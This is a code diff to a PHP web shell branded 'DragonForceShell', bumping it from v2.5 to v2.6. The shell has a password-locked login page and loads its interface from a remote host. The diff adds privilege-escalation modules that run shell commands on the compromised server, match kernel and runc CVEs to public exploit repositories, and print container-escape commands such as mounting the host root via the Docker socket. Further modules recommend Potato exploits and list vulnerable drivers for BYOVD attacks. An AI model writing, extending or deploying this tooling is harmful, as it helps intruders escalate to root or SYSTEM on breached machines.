+                'glibc'=>true,
+                'desc'=>'Buffer overflow in glibc ld.so GLIBC_TUNABLES handling, full root on most distros',
+                'exploit'=>'https://github.com/ly4k/looney-tunables'),
+            // runc escape - CVE-2024-21626
+            array('cve'=>'CVE-2024-21626','name'=>'runc Container Escape (Leaky Vessels)',
+                'runc'=>true,
+                'desc'=>'File descriptor leak lets container process access host filesystem',
+                'exploit'=>'https://github.com/advisories/GHSA-xr7r-f8xq-vfvv'),
+            // io_uring - CVE-2024-0582
+            array('cve'=>'CVE-2024-0582','name'=>'io_uring UAF',
+                'min'=>'5.10.0','max'=>'6.7.1',
+                'desc'=>'Use-after-free in io_uring allows local privilege escalation',
+                'exploit'=>'https://github.com/puckiestyle/CVE-2024-0582'),
         );
 
         $foundCVEs = array();
@@ -2044,6 +2352,30 @@ Document Root : ".$this->DFSH($GLOBALS['DFConfig'][2]['DOCUMENT_ROOT'] ?? '')." 
                     if(version_compare($ver,'1.9.5p2','<')){
                         $foundCVEs[] = $cve;
                     }
+                }
+                continue;
+            }
+            // glibc check (Looney Tunables CVE-2023-4911 — glibc < 2.35-5 vulnerable)
+            if(isset($cve['glibc'])){
+                $glibcVer = $this->DFSLPECmd('ldd --version 2>/dev/null | head -1');
+                if(preg_match('/([\d]+\.[\d]+)/',$glibcVer,$m)){
+                    if(version_compare($m[1],'2.35','<')){
+                        $foundCVEs[] = $cve;
+                    }
+                }
+                continue;
+            }
+            // runc check (CVE-2024-21626 — runc < 1.1.12 vulnerable)
+            if(isset($cve['runc'])){
+                $runcVer = $this->DFSLPECmd('runc --version 2>/dev/null | head -1; docker --version 2>/dev/null | head -1');
+                if(preg_match('/runc version\s+([\d.]+)/i',$runcVer,$m)){
+                    if(version_compare($m[1],'1.1.12','<')){
+                        $foundCVEs[] = $cve;
+                    }
+                }elseif(stripos($runcVer,'docker')!==false){
+                    // docker present but runc binary not in PATH — flag for manual check
+                    $cve['desc'] .= ' (docker found, verify runc version manually)';
+                    $foundCVEs[] = $cve;
                 }
                 continue;
             }
@@ -2488,6 +2820,42 @@ Document Root : ".$this->DFSH($GLOBALS['DFConfig'][2]['DOCUMENT_ROOT'] ?? '')." 
         $this->DFSLPELog($t,'not_found','No known polkit vulnerabilities matched','low');
     }
 
+    private function LPE_Linux_ContainerEscape(){
+        $t = 'Container Escape (runc / privileged)';
+        $this->DFSLPELog($t,'checked','Checking runc version and privileged container flags','critical');
+
+        $body = '';
+        $found = false;
+
+        $runcVer = $this->DFSLPECmd('runc --version 2>/dev/null | head -1');
+        if(!empty($runcVer)){
+            $body .= "<p>runc: <b>".htmlspecialchars(trim($runcVer))."</b></p>";
+            if(preg_match('/runc version\s+([\d.]+)/i',$runcVer,$m) && version_compare($m[1],'1.1.12','<')){
+                $body .= "<p style='color:#f70000'><b>VULNERABLE to CVE-2024-21626 (Leaky Vessels)!</b> runc &lt; 1.1.12 allows container escape via leaked host file descriptors.</p>";
+                $found = true;
+            }
+        }
+        // privileged flags: host pid/net + docker socket + writable cgroup
+        $priv = $this->DFSLPECmd('cat /proc/self/status 2>/dev/null | grep -i cap; ls -la /var/run/docker.sock 2>/dev/null; cat /proc/self/mountinfo 2>/dev/null | head -5');
+        if(stripos($priv,'docker.sock')!==false){
+            $body .= "<p style='color:#f70000'><b>Docker socket mounted inside container!</b> Escape via <code>docker run -v /:/host alpine chroot /host bash</code></p>";
+            $found = true;
+        }
+        $capOut = $this->DFSLPECmd('capsh --print 2>/dev/null | head -3; grep CapEff /proc/self/status 2>/dev/null');
+        if(stripos($capOut,'000001ffffffffff')!==false || stripos($capOut,'cap_sys_admin')!==false){
+            $body .= "<p style='color:#f70000'><b>Full capabilities (SYS_ADMIN?) — privileged container likely.</b> Try <code>mount -o remount,rw /</code> or host device abuse.</p>";
+            $found = true;
+        }
+        if(!empty($priv)){ $body .= "<pre style='max-height:120px;overflow:auto'>".htmlspecialchars(trim($priv))."</pre>"; }
+
+        if(!$found){
+            $this->DFSLPELog($t,'not_found','No container escape vectors found','low');
+            return;
+        }
+        $this->DFSLPEAdd('Container Escape Vectors', 'critical', $body);
+        $this->DFSLPELog($t,'found','Container escape vector found','critical');
+    }
+
     // --- Windows techniques ---
 
     private function LPE_Win_TokenPrivileges(){
@@ -2739,6 +3107,12 @@ Document Root : ".$this->DFSH($GLOBALS['DFConfig'][2]['DOCUMENT_ROOT'] ?? '')." 
                 'minBuild'=>10240,'desc'=>'Microsoft Windows and Office spoofing','exploit'=>'https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36884'),
             array('cve'=>'CVE-2025-24989','name'=>'Windows Kernel LPE',
                 'minBuild'=>10240,'desc'=>'Windows kernel elevation of privilege vulnerability','exploit'=>'https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-24989'),
+            array('cve'=>'CVE-2023-28252','name'=>'CLFS LPE',
+                'minBuild'=>10240,'maxBuild'=>22631,'desc'=>'Common Log File System driver EoP, exploited in the wild','exploit'=>'https://github.com/fortra/CVE-2023-28252'),
+            array('cve'=>'CVE-2024-30090','name'=>'Win32k Streaming EoP',
+                'minBuild'=>10240,'desc'=>'Win32k kernel streaming service elevation of privilege','exploit'=>'https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30090'),
+            array('cve'=>'CVE-2025-21418','name'=>'AFD.sys LPE',
+                'minBuild'=>10240,'desc'=>'Ancillary Function Driver elevation of privilege','exploit'=>'https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-21418'),
         );
 
         $matched = array();
@@ -2844,6 +3218,66 @@ Document Root : ".$this->DFSH($GLOBALS['DFConfig'][2]['DOCUMENT_ROOT'] ?? '')." 
         $this->DFSLPELog($t,'found','Writable PATH dirs found','high');
     }
 
+    private function LPE_Win_PotatoAttack(){
+        $t = 'Potato Attack Surface (SeImpersonate)';
+        $this->DFSLPELog($t,'checked','Checking SeImpersonate privilege and suggesting the right Potato','high');
+
+        $privs = $this->DFSLPEWinCmd('whoami /priv 2>&1');
+        if(empty($privs)){
+            $this->DFSLPELog($t,'skipped','whoami /priv returned nothing','low');
+            return;
+        }
+        if(stripos($privs,'SeImpersonatePrivilege')===false){
+            $this->DFSLPELog($t,'not_found','SeImpersonatePrivilege not held — Potato attacks not viable','low');
+            return;
+        }
+        $info = $this->DFSLPEParseWinBuild();
+        $build = intval($info['build']);
+        // pick the right potato for the build
+        if($build>=22000){
+            $tool = 'GodPotato / SweetPotato (works on Win11 / Server 2022)';
+            $link = 'https://github.com/BeichenDream/GodPotato';
+        }elseif($build>=10240){
+            $tool = 'JuicyPotatoNG / SweetPotato (Win10 / Server 2016-2019)';
+            $link = 'https://github.com/antonioCoco/JuicyPotatoNG';
+        }else{
+            $tool = 'JuicyPotato / RoguePotato (Win7-2008 legacy)';
+            $link = 'https://github.com/antonioCoco/RoguePotato';
+        }
+        $body = "<p style='color:#f70000'><b>SeImpersonatePrivilege held!</b> Potato attack viable.</p>";
+        $body .= "<p>Suggested tool for build <b>".htmlspecialchars($info['build'])."</b>: <b>".htmlspecialchars($tool)."</b><br>";
+        $body .= "<span style='font-size:11px;color:#4d7cff'>Exploit: <a href='".$this->DFSH($link)."' target='_blank'>".htmlspecialchars($link)."</a></span></p>";
+        $body .= "<pre style='max-height:120px;overflow:auto'>".htmlspecialchars(trim($privs))."</pre>";
+        $this->DFSLPEAdd('Potato Attack (SeImpersonate)', 'critical', $body);
+        $this->DFSLPELog($t,'found','SeImpersonate held — '.$tool,'critical');
+    }
+
+    private function LPE_Win_VulnDrivers(){
+        $t = 'Vulnerable Drivers (BYOVD)';
+        $this->DFSLPELog($t,'checked','Scanning loaded drivers against known BYOVD list','high');
+
+        // known-bad drivers abused for Bring-Your-Own-Vulnerable-Driver EoP
+        $badDrivers = array('WinRing0','RTCore64','RTCore32','DBUtilDrv2','DBUtil_2_3','AsUpIO','AsIO',
+            'inpoutx64','Htsysm72','GDRV','GLCKIO','MSI_MSI','epidrv','iqvw64e','mhyprot2s');
+        $drvOut = $this->DFSLPEWinCmd('driverquery /v /fo list 2>&1 | head -80');
+        if(empty($drvOut)){
+            $this->DFSLPELog($t,'skipped','driverquery returned nothing','low');
+            return;
+        }
+        $hits = array();
+        foreach($badDrivers as $bd){
+            if(stripos($drvOut,$bd)!==false){ $hits[] = $bd; }
+        }
+        if(empty($hits)){
+            $this->DFSLPELog($t,'not_found','No known vulnerable drivers loaded','low');
+            return;
+        }
+        $body = "<p style='color:#f70000'><b>".count($hits)." known-vulnerable driver(s) loaded:</b> ".htmlspecialchars(implode(', ',$hits))."</p>";
+        $body .= "<p style='color:#aaa;font-size:11px'>These drivers allow kernel read/write from userland (BYOVD). Check <code>https://www.loldrivers.io</code> for EoP PoCs.</p>";
+        $this->DFSLPEAdd('Vulnerable Drivers (BYOVD)', 'critical', $body);
+        $this->DFSLPELog($t,'found',count($hits).' BYOVD drivers loaded','critical');
+    }
+
     // --- Main entry point ---
 
     public function DFSLPE(){
@@ -2863,7 +3297,7 @@ Document Root : ".$this->DFSH($GLOBALS['DFConfig'][2]['DOCUMENT_ROOT'] ?? '')." 
         $this->DFSLPEDetectOS();
 
         $lpeResults = "<section class='lpe'>";
-        $lpeResults .= "<h3>Auto Privilege Escalation Audit <small style='color:#888'>(v2.5 — Cross-Platform)</small></h3>";
+        $lpeResults .= "<h3>Auto Privilege Escalation Audit <small style='color:#888'>(v2.6 — Cross-Platform)</small></h3>";
 
         // System info banner
         $lpeResults .= "<div class='lpe-finding lpe-info'>";
@@ -2888,6 +3322,7 @@ Document Root : ".$this->DFSH($GLOBALS['DFConfig'][2]['DOCUMENT_ROOT'] ?? '')." 
             $this->LPE_Linux_WritableServices();
             $this->LPE_Linux_WritableTmpAndPath();
             $this->LPE_Linux_Polkit();
+            $this->LPE_Linux_ContainerEscape();
         }elseif($this->lpePlatform === 'windows'){
             $this->LPE_Win_TokenPrivileges();
             $this->LPE_Win_UnquotedService();
@@ -2899,6 +3334,8 @@ Document Root : ".$this->DFSH($GLOBALS['DFConfig'][2]['DOCUMENT_ROOT'] ?? '')." 
             $this->LPE_Win_KernelCVE();
             $this->LPE_Win_StoredCredentials();
             $this->LPE_Win_DLLHijacking();
+            $this->LPE_Win_PotatoAttack();
+            $this->LPE_Win_VulnDrivers();
         }else{
             $lpeResults .= "<div class='lpe-finding lpe-critical'><h4>Unsupported Platform</h4>";
             $lpeResults .= "<p>Detected platform: ".$this->DFSH(PHP_OS).". LPE checks support Linux and Windows only.</p></div>";
@@ -2973,14 +3410,14 @@ Document Root : ".$this->DFSH($GLOBALS['DFConfig'][2]['DOCUMENT_ROOT'] ?? '')." 
         $c = $this->DFSFetch(self::$remote_url . "/login.html");
         if($c!==""){ return $c; }
         return "<!DOCTYPE html><html lang='en'><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1'>"
-        ."<title>DragonForceShell V2.5 - Login</title><style>"
+        ."<title>DragonForceShell V2.6 - Login</title><style>"
         ."body{min-height:100vh;display:flex;align-items:center;justify-content:center;background:#0d0b00;color:#FFD700;font-family:monospace;margin:0;padding:20px}"
         .".c{width:100%;max-width:360px;text-align:center;background:#000;border:1px solid #4a3d05;border-radius:14px;padding:28px 24px}"
         .".b{font-size:24px;letter-spacing:3px;color:#4d7cff}.b span{color:#f70000}h1{font-size:15px;letter-spacing:2px;margin:6px 0 2px}"
         .".s{font-size:10px;color:#888;margin-bottom:16px;letter-spacing:1px}"
         ."input[type=password]{width:100%;height:42px;background:#111;border:1px solid #4a3d05;border-radius:8px;color:#FFD700;font-size:16px;padding:0 12px;outline:none}"
         ."input[type=submit]{width:100%;height:42px;margin-top:12px;border:none;border-radius:8px;background:#2b2470;color:#fff;letter-spacing:3px;cursor:pointer}"
-        ."</style></head><body><div class='c'><div class='b'>DFS <span>V2.5</span></div><h1>DragonForceShell</h1>"
+        ."</style></head><body><div class='c'><div class='b'>DFS <span>V2.6</span></div><h1>DragonForceShell</h1>"
         ."<p class='s'>RESTRICTED ACCESS</p><form action='' method='POST' autocomplete='off'>"
         ."<input type='password' name='password' required autofocus placeholder='Password'>"
         ."<input type='submit' name='login' value='UNLOCK'></form></div></body></html>";
@@ -2992,7 +3429,7 @@ Document Root : ".$this->DFSH($GLOBALS['DFConfig'][2]['DOCUMENT_ROOT'] ?? '')." 
         $localJs   = __DIR__ . '/contents/script.js';
         if(is_file($localHead)){ $contents = @file_get_contents($localHead); }
         else{ $contents = $this->DFSFetch(self::$remote_url . "/head.html"); }
-        if(!isset($contents)||$contents===""||$contents===false){ $contents = "<!DOCTYPE html><html lang='en'><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1'><title>DragonForceShell V2.5 [DFS]</title><script>%{js}%</script><style>%{style}%</style></head><body><div style='text-align:center;color:#4d7cff;letter-spacing:3px'>DFS <span style='color:#f70000'>V2.5</span></div>%{body}%"; }
+        if(!isset($contents)||$contents===""||$contents===false){ $contents = "<!DOCTYPE html><html lang='en'><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1'><title>DragonForceShell V2.6 [DFS]</title><script>%{js}%</script><style>%{style}%</style></head><body><div style='text-align:center;color:#4d7cff;letter-spacing:3px'>DFS <span style='color:#f70000'>V2.6</span></div>%{body}%"; }
         if(is_file($localCss)){ $css = @file_get_contents($localCss); }
         else{ $css = $this->DFSFetch(self::$remote_url . "/dfs.css"); }
         if(!isset($css)||$css===""||$css===false){ $css = "body{background:#0d0b00;color:#FFD700;font-family:monospace} a{color:#FFD700}"; }
@@ -3020,7 +3457,7 @@ Document Root : ".$this->DFSH($GLOBALS['DFConfig'][2]['DOCUMENT_ROOT'] ?? '')." 
         $local = __DIR__ . '/contents/foot.html';
         if(is_file($local)){ $contents = @file_get_contents($local); }
         else{ $contents = $this->DFSFetch(self::$remote_url . "/foot.html"); }
-        if(!isset($contents)||$contents===""||$contents===false){ $contents = "<section class='eagle'><p style='color:#fff;text-align:center'>DragonForceShell V2.5 by EagleEye</p></section>"; }
+        if(!isset($contents)||$contents===""||$contents===false){ $contents = "<section class='eagle'><p style='color:#fff;text-align:center'>DragonForceShell V2.6 by EagleEye</p></section>"; }
         return $contents;
     }
     public function DFSDefault(){
